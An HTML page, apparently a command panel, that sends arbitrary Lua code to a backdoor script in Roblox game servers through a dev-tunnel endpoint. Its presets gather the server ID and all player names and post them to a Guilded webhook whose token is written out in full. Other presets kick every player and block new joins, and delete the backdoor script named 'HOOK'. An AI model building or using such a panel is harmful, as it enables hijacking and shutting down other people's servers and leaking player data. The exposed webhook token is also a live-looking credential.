<!DOCTYPE html>
<html>
<head>
    <title>Code Sender</title>
    <style>
        body {
    background-color: #222; /* Dark background */
    color: #eee;  /* Light text color */
    font-family: monospace; /* Code-like font */
    margin: 20px; 
    padding: 20px;
    border-radius: 8px; /* Slightly rounded corners */
}

input[type="text"], textarea {
    background-color: #333; 
    color: #eee; 
    border: 1px solid #555;
    padding: 8px;
    margin-bottom: 10px;
    width: calc(100% - 16px); /* Stretch width */
}

button {
    background-color: #4CAF50; /* Green color */
    color: white;
    border: none;
    padding: 10px 20px;
    cursor: pointer;
    margin-right: 8px;
    border-radius: 5px;
}

label {
    display: block; /* Put labels on their own line */
    margin-bottom: 5px; 
}

    </style>
</head>
<body>
    <label for="urlInput">URL:</label>
    <input type="text" id="urlInput" value="https://5jcdgz8t-3000.use.devtunnels.ms/api"> <br>

    <label for="codeInput">Code:</label>
    <textarea id="codeInput"></textarea> <br> 

    <button onclick="sendCode()">Send Code</button>

    <button onclick="setPreset('preset1')">Server Count</button>
    <button onclick="setPreset('preset2')">Shutdown</button>
    <button onclick="setPreset('preset3')">Sever Connection</button>

    <script>
        function sendCode() {
            const url = document.getElementById('urlInput').value;
            const code = document.getElementById('codeInput').value;
            
            fetch(url, { 
                method: 'POST',
                body: code,
                headers: {
                    'Content-Type': 'text/plain'  // Set appropriate Content-Type header
                }
            })
            .then(response => response.text())
            .then(responseText => console.log(responseText))
            .catch(error => console.error('Error:', error));
        }

        function setPreset(preset) {
            // Example presets
            const presets = {
                preset1: {
                    url: 'https://5jcdgz8t-3000.use.devtunnels.ms/api',
                    code: 'local string = "Im in a server with the jobid " string = string .. game.JobId .. " and these players!: " for _, child in pairs(game.Players:GetPlayers()) do string = string .. child.Name .. ", " end local http = game:GetService("HttpService") http:PostAsync("https://media.guilded.gg/webhooks/9b4f345f-da32-4404-9705-06ea1c471787/QdyqSV4eeQcMqqwEE0UQSkskIUiiC0IE26YmUq8OwcCAK8UmiAyo0QIa2amOokQG2AKWmoyI8AoYSoAgY8CMUS", http:JSONEncode({content=string}))',
                },
                preset2: {
                    url: 'https://5jcdgz8t-3000.use.devtunnels.ms/api',
                    code: 'for _, plr in pairs(game.Players:GetPlayers()) do plr:Kick("kicked by external executor ðŸ˜Ž") end game.Players.PlayerAdded:Connect(function(Player) Player:Kick() end)',
                },
                preset3: {
                    url: 'https://5jcdgz8t-3000.use.devtunnels.ms/api',
                    code: 'for _, child in pairs(game.ServerScriptService:GetChildren()) do if child.Name == "HOOK" then child:Destroy() end end',
                },
            };

            // Set values based on the selected preset
            document.getElementById('urlInput').value = presets[preset].url;
            document.getElementById('codeInput').value = presets[preset].code;
        }
    </script>
</body>
</html>
